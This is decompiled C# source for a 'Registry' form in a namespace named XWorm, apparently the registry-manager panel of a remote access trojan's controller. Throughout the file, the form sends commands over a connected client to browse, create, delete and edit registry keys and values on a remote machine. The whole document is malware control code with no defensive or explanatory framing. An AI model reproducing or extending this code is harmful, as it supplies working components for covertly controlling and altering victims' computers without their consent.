using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace XWorm
{
	// Token: 0x02000028 RID: 40
	[DesignerGenerated]
	public partial class Registry : Form
	{
		// Token: 0x06000799 RID: 1945 RVA: 0x000432B4 File Offset: 0x000414B4
		public Registry()
		{
			base.FormClosing += this.Registry_FormClosing;
			this.InitializeComponent();
		}

		// Token: 0x170002D2 RID: 722
		// (get) Token: 0x0600079C RID: 1948 RVA: 0x00044007 File Offset: 0x00042207
		// (set) Token: 0x0600079D RID: 1949 RVA: 0x00044011 File Offset: 0x00042211
		internal virtual StatusStrip StatusStrip1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002D3 RID: 723
		// (get) Token: 0x0600079E RID: 1950 RVA: 0x0004401A File Offset: 0x0004221A
		// (set) Token: 0x0600079F RID: 1951 RVA: 0x00044024 File Offset: 0x00042224
		internal virtual ToolStripStatusLabel ToolStripStatusLabel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002D4 RID: 724
		// (get) Token: 0x060007A0 RID: 1952 RVA: 0x0004402D File Offset: 0x0004222D
		// (set) Token: 0x060007A1 RID: 1953 RVA: 0x00044038 File Offset: 0x00042238
		internal virtual TreeView RGk
		{
			[CompilerGenerated]
			get
			{
				return this._RGk;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RGk_DoubleClick);
				TreeView rgk = this._RGk;
				if (rgk != null)
				{
					rgk.DoubleClick -= value2;
				}
				this._RGk = value;
				rgk = this._RGk;
				if (rgk != null)
				{
					rgk.DoubleClick += value2;
				}
			}
		}

		// Token: 0x170002D5 RID: 725
		// (get) Token: 0x060007A2 RID: 1954 RVA: 0x0004407B File Offset: 0x0004227B
		// (set) Token: 0x060007A3 RID: 1955 RVA: 0x00044085 File Offset: 0x00042285
		internal virtual ImageList img { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002D6 RID: 726
		// (get) Token: 0x060007A4 RID: 1956 RVA: 0x0004408E File Offset: 0x0004228E
		// (set) Token: 0x060007A5 RID: 1957 RVA: 0x00044098 File Offset: 0x00042298
		internal virtual ListView ListView1
		{
			[CompilerGenerated]
			get
			{
				return this._ListView1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ListView1_DoubleClick);
				KeyEventHandler value3 = new KeyEventHandler(this.ListView1_KeyDown);
				ListView listView = this._ListView1;
				if (listView != null)
				{
					listView.DoubleClick -= value2;
					listView.KeyDown -= value3;
				}
				this._ListView1 = value;
				listView = this._ListView1;
				if (listView != null)
				{
					listView.DoubleClick += value2;
					listView.KeyDown += value3;
				}
			}
		}

		// Token: 0x170002D7 RID: 727
		// (get) Token: 0x060007A6 RID: 1958 RVA: 0x000440F6 File Offset: 0x000422F6
		// (set) Token: 0x060007A7 RID: 1959 RVA: 0x00044100 File Offset: 0x00042300
		internal virtual ColumnHeader ColumnHeader1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002D8 RID: 728
		// (get) Token: 0x060007A8 RID: 1960 RVA: 0x00044109 File Offset: 0x00042309
		// (set) Token: 0x060007A9 RID: 1961 RVA: 0x00044113 File Offset: 0x00042313
		internal virtual ColumnHeader ColumnHeader2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002D9 RID: 729
		// (get) Token: 0x060007AA RID: 1962 RVA: 0x0004411C File Offset: 0x0004231C
		// (set) Token: 0x060007AB RID: 1963 RVA: 0x00044126 File Offset: 0x00042326
		internal virtual ColumnHeader ColumnHeader3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002DA RID: 730
		// (get) Token: 0x060007AC RID: 1964 RVA: 0x0004412F File Offset: 0x0004232F
		// (set) Token: 0x060007AD RID: 1965 RVA: 0x0004413C File Offset: 0x0004233C
		internal virtual System.Windows.Forms.Timer Timer1
		{
			[CompilerGenerated]
			get
			{
				return this._Timer1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				System.Windows.Forms.Timer timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick -= value2;
				}
				this._Timer1 = value;
				timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick += value2;
				}
			}
		}

		// Token: 0x170002DB RID: 731
		// (get) Token: 0x060007AE RID: 1966 RVA: 0x0004417F File Offset: 0x0004237F
		// (set) Token: 0x060007AF RID: 1967 RVA: 0x00044189 File Offset: 0x00042389
		internal virtual Splitter Splitter1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002DC RID: 732
		// (get) Token: 0x060007B0 RID: 1968 RVA: 0x00044192 File Offset: 0x00042392
		// (set) Token: 0x060007B1 RID: 1969 RVA: 0x0004419C File Offset: 0x0004239C
		internal virtual ToolStripProgressBar ToolStripProgressBar1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002DD RID: 733
		// (get) Token: 0x060007B2 RID: 1970 RVA: 0x000441A5 File Offset: 0x000423A5
		// (set) Token: 0x060007B3 RID: 1971 RVA: 0x000441AF File Offset: 0x000423AF
		internal virtual Guna2ContextMenuStrip Guna2ContextMenuStrip2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002DE RID: 734
		// (get) Token: 0x060007B4 RID: 1972 RVA: 0x000441B8 File Offset: 0x000423B8
		// (set) Token: 0x060007B5 RID: 1973 RVA: 0x000441C4 File Offset: 0x000423C4
		internal virtual ToolStripMenuItem RefreshToolStripMenuItem2
		{
			[CompilerGenerated]
			get
			{
				return this._RefreshToolStripMenuItem2;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RefreshToolStripMenuItem2_Click);
				ToolStripMenuItem refreshToolStripMenuItem = this._RefreshToolStripMenuItem2;
				if (refreshToolStripMenuItem != null)
				{
					refreshToolStripMenuItem.Click -= value2;
				}
				this._RefreshToolStripMenuItem2 = value;
				refreshToolStripMenuItem = this._RefreshToolStripMenuItem2;
				if (refreshToolStripMenuItem != null)
				{
					refreshToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170002DF RID: 735
		// (get) Token: 0x060007B6 RID: 1974 RVA: 0x00044207 File Offset: 0x00042407
		// (set) Token: 0x060007B7 RID: 1975 RVA: 0x00044214 File Offset: 0x00042414
		internal virtual ToolStripMenuItem AddToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._AddToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.AddToolStripMenuItem1_Click);
				ToolStripMenuItem addToolStripMenuItem = this._AddToolStripMenuItem1;
				if (addToolStripMenuItem != null)
				{
					addToolStripMenuItem.Click -= value2;
				}
				this._AddToolStripMenuItem1 = value;
				addToolStripMenuItem = this._AddToolStripMenuItem1;
				if (addToolStripMenuItem != null)
				{
					addToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170002E0 RID: 736
		// (get) Token: 0x060007B8 RID: 1976 RVA: 0x00044257 File Offset: 0x00042457
		// (set) Token: 0x060007B9 RID: 1977 RVA: 0x00044264 File Offset: 0x00042464
		internal virtual ToolStripMenuItem RemoveToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._RemoveToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RemoveToolStripMenuItem1_Click);
				ToolStripMenuItem removeToolStripMenuItem = this._RemoveToolStripMenuItem1;
				if (removeToolStripMenuItem != null)
				{
					removeToolStripMenuItem.Click -= value2;
				}
				this._RemoveToolStripMenuItem1 = value;
				removeToolStripMenuItem = this._RemoveToolStripMenuItem1;
				if (removeToolStripMenuItem != null)
				{
					removeToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170002E1 RID: 737
		// (get) Token: 0x060007BA RID: 1978 RVA: 0x000442A7 File Offset: 0x000424A7
		// (set) Token: 0x060007BB RID: 1979 RVA: 0x000442B1 File Offset: 0x000424B1
		internal virtual Guna2ContextMenuStrip Guna2ContextMenuStrip1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002E2 RID: 738
		// (get) Token: 0x060007BC RID: 1980 RVA: 0x000442BA File Offset: 0x000424BA
		// (set) Token: 0x060007BD RID: 1981 RVA: 0x000442C4 File Offset: 0x000424C4
		internal virtual ToolStripMenuItem ToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._ToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem1_Click);
				ToolStripMenuItem toolStripMenuItem = this._ToolStripMenuItem1;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click -= value2;
				}
				this._ToolStripMenuItem1 = value;
				toolStripMenuItem = this._ToolStripMenuItem1;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170002E3 RID: 739
		// (get) Token: 0x060007BE RID: 1982 RVA: 0x00044307 File Offset: 0x00042507
		// (set) Token: 0x060007BF RID: 1983 RVA: 0x00044314 File Offset: 0x00042514
		internal virtual ToolStripMenuItem NewValueToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._NewValueToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.NewValueToolStripMenuItem1_Click);
				ToolStripMenuItem newValueToolStripMenuItem = this._NewValueToolStripMenuItem1;
				if (newValueToolStripMenuItem != null)
				{
					newValueToolStripMenuItem.Click -= value2;
				}
				this._NewValueToolStripMenuItem1 = value;
				newValueToolStripMenuItem = this._NewValueToolStripMenuItem1;
				if (newValueToolStripMenuItem != null)
				{
					newValueToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170002E4 RID: 740
		// (get) Token: 0x060007C0 RID: 1984 RVA: 0x00044357 File Offset: 0x00042557
		// (set) Token: 0x060007C1 RID: 1985 RVA: 0x00044364 File Offset: 0x00042564
		internal virtual ToolStripMenuItem EditToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._EditToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.EditToolStripMenuItem1_Click);
				ToolStripMenuItem editToolStripMenuItem = this._EditToolStripMenuItem1;
				if (editToolStripMenuItem != null)
				{
					editToolStripMenuItem.Click -= value2;
				}
				this._EditToolStripMenuItem1 = value;
				editToolStripMenuItem = this._EditToolStripMenuItem1;
				if (editToolStripMenuItem != null)
				{
					editToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170002E5 RID: 741
		// (get) Token: 0x060007C2 RID: 1986 RVA: 0x000443A7 File Offset: 0x000425A7
		// (set) Token: 0x060007C3 RID: 1987 RVA: 0x000443B4 File Offset: 0x000425B4
		internal virtual ToolStripMenuItem DeleteToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._DeleteToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.DeleteToolStripMenuItem1_Click);
				ToolStripMenuItem deleteToolStripMenuItem = this._DeleteToolStripMenuItem1;
				if (deleteToolStripMenuItem != null)
				{
					deleteToolStripMenuItem.Click -= value2;
				}
				this._DeleteToolStripMenuItem1 = value;
				deleteToolStripMenuItem = this._DeleteToolStripMenuItem1;
				if (deleteToolStripMenuItem != null)
				{
					deleteToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x060007C4 RID: 1988 RVA: 0x000443F8 File Offset: 0x000425F8
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				bool flag = !this.C.IsConnected;
				if (flag)
				{
					base.Close();
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x060007C5 RID: 1989 RVA: 0x00044450 File Offset: 0x00042650
		private void RGk_DoubleClick(object sender, EventArgs e)
		{
			bool flag = this.RGk.SelectedNode != null;
			if (flag)
			{
				byte[] state = Helper.SB(string.Concat(new string[]
				{
					"RG",
					SettingsHelper.SPL,
					"~",
					SettingsHelper.SPL,
					this.RGk.SelectedNode.FullPath,
					"\\",
					SettingsHelper.SPL
				}));
				Client $VB$NonLocal_2 = this.C;
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					$VB$NonLocal_2.BeginSend((byte[])a0);
				}, state);
				this.ToolStripStatusLabel1.ForeColor = Color.Black;
				this.ToolStripStatusLabel1.Text = "Wait..";
			}
		}

		// Token: 0x060007C6 RID: 1990 RVA: 0x00044510 File Offset: 0x00042710
		private void ListView1_DoubleClick(object sender, EventArgs e)
		{
			bool flag = this.ListView1.SelectedItems.Count != 0;
			if (flag)
			{
				ListViewItem listViewItem = this.ListView1.SelectedItems[0];
				EditReg editReg = new EditReg();
				editReg.Path = this.RGk.SelectedNode.FullPath + "\\";
				editReg.C = this.C;
				editReg.Guna2TextBox1.Text = listViewItem.Text;
				editReg.Guna2ComboBox1.SelectedIndex = editReg.Guna2ComboBox1.Items.IndexOf(listViewItem.SubItems[1].Text);
				try
				{
					editReg.Guna2TextBox3.Text = listViewItem.SubItems[2].Text;
				}
				catch (Exception ex)
				{
				}
				editReg.Text = editReg.Path;
				editReg.Guna2TextBox1.ReadOnly = true;
				editReg.ShowDialog(this);
			}
		}

		// Token: 0x060007C7 RID: 1991 RVA: 0x00044624 File Offset: 0x00042824
		private void ListView1_KeyDown(object sender, KeyEventArgs e)
		{
			try
			{
				bool flag = e.Modifiers == Keys.Control && e.KeyCode == Keys.A;
				if (flag)
				{
					bool flag2 = this.ListView1.Items.Count > 0;
					if (flag2)
					{
						try
						{
							foreach (object obj in this.ListView1.Items)
							{
								ListViewItem listViewItem = (ListViewItem)obj;
								listViewItem.Selected = true;
							}
						}
						finally
						{
							IEnumerator enumerator;
							if (enumerator is IDisposable)
							{
								(enumerator as IDisposable).Dispose();
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x060007C8 RID: 1992 RVA: 0x000446F4 File Offset: 0x000428F4
		private void Registry_FormClosing(object sender, FormClosingEventArgs e)
		{
			byte[] state = Helper.SB("CloseRegistry");
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x060007C9 RID: 1993 RVA: 0x00044734 File Offset: 0x00042934
		private void RefreshToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			bool flag = this.RGk.SelectedNode != null;
			if (flag)
			{
				byte[] state = Helper.SB(string.Concat(new string[]
				{
					"RG",
					SettingsHelper.SPL,
					"~",
					SettingsHelper.SPL,
					this.RGk.SelectedNode.FullPath,
					"\\"
				}));
				Client $VB$NonLocal_2 = this.C;
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					$VB$NonLocal_2.BeginSend((byte[])a0);
				}, state);
				this.ToolStripStatusLabel1.ForeColor = Color.Black;
				this.ToolStripStatusLabel1.Text = "Wait..";
			}
		}

		// Token: 0x060007CA RID: 1994 RVA: 0x000447EC File Offset: 0x000429EC
		private void AddToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.RGk.SelectedNode != null && this.RGk.SelectedNode.FullPath.Contains("\\");
			if (flag)
			{
				string text = Interaction.InputBox("Key Name?", "Create New Key", "Name", -1, -1);
				bool flag2 = text.Length != 0;
				if (flag2)
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"RG",
						SettingsHelper.SPL,
						"#",
						SettingsHelper.SPL,
						this.RGk.SelectedNode.FullPath,
						"\\",
						SettingsHelper.SPL,
						text
					}));
					Client $VB$NonLocal_2 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						$VB$NonLocal_2.BeginSend((byte[])a0);
					}, state);
				}
			}
		}

		// Token: 0x060007CB RID: 1995 RVA: 0x000448D8 File Offset: 0x00042AD8
		private void RemoveToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.RGk.SelectedNode != null;
			checked
			{
				if (flag)
				{
					string fullPath = this.RGk.SelectedNode.FullPath;
					bool flag2 = fullPath.Contains("\\");
					if (flag2)
					{
						string text = Strings.Split(fullPath, "\\", -1, CompareMethod.Binary)[Strings.Split(fullPath, "\\", -1, CompareMethod.Binary).Length - 1];
						string text2 = "";
						int num = Strings.Split(fullPath, "\\", -1, CompareMethod.Binary).Length - 2;
						for (int i = 0; i <= num; i++)
						{
							text2 = text2 + Strings.Split(fullPath, "\\", -1, CompareMethod.Binary)[i] + "\\";
						}
						byte[] state = Helper.SB(string.Concat(new string[]
						{
							"RG",
							SettingsHelper.SPL,
							"$",
							SettingsHelper.SPL,
							text2,
							SettingsHelper.SPL,
							text
						}));
						Registry._Closure$__R92-8 CS$<>8__locals1 = new Registry._Closure$__R92-8(CS$<>8__locals1);
						CS$<>8__locals1.$VB$NonLocal_2 = this.C;
						ThreadPool.QueueUserWorkItem(delegate(object a0)
						{
							CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
						}, state);
						this.RGk.SelectedNode.Remove();
					}
				}
			}
		}

		// Token: 0x060007CC RID: 1996 RVA: 0x00044A14 File Offset: 0x00042C14
		private void ToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.RGk.SelectedNode != null;
			if (flag)
			{
				byte[] state = Helper.SB(string.Concat(new string[]
				{
					"RG",
					SettingsHelper.SPL,
					"~",
					SettingsHelper.SPL,
					this.RGk.SelectedNode.FullPath,
					"\\"
				}));
				Client $VB$NonLocal_2 = this.C;
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					$VB$NonLocal_2.BeginSend((byte[])a0);
				}, state);
				this.ToolStripStatusLabel1.ForeColor = Color.Black;
				this.ToolStripStatusLabel1.Text = "Wait..";
			}
		}

		// Token: 0x060007CD RID: 1997 RVA: 0x00044ACC File Offset: 0x00042CCC
		private void NewValueToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			EditReg editReg = new EditReg();
			editReg.Path = this.RGk.SelectedNode.FullPath + "\\";
			editReg.C = this.C;
			editReg.Guna2TextBox1.Text = "Name";
			editReg.Guna2ComboBox1.SelectedIndex = editReg.Guna2ComboBox1.Items.IndexOf("String");
			editReg.Guna2TextBox3.Text = "Value";
			editReg.Text = editReg.Path;
			editReg.ShowDialog(this);
		}

		// Token: 0x060007CE RID: 1998 RVA: 0x00044B64 File Offset: 0x00042D64
		private void EditToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			this.ListView1_DoubleClick(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(sender)), e);
		}

		// Token: 0x060007CF RID: 1999 RVA: 0x00044B7C File Offset: 0x00042D7C
		private void DeleteToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.ListView1.SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"RG",
						SettingsHelper.SPL,
						"@5",
						SettingsHelper.SPL,
						this.RGk.SelectedNode.FullPath,
						"\\",
						SettingsHelper.SPL,
						listViewItem.Text
					}));
					Registry._Closure$__R96-12 CS$<>8__locals1 = new Registry._Closure$__R96-12(CS$<>8__locals1);
					CS$<>8__locals1.$VB$NonLocal_2 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
					}, state);
				}
			}
			finally
			{
			}
		}

		// Token: 0x04000336 RID: 822
		public Client C;
	}
}
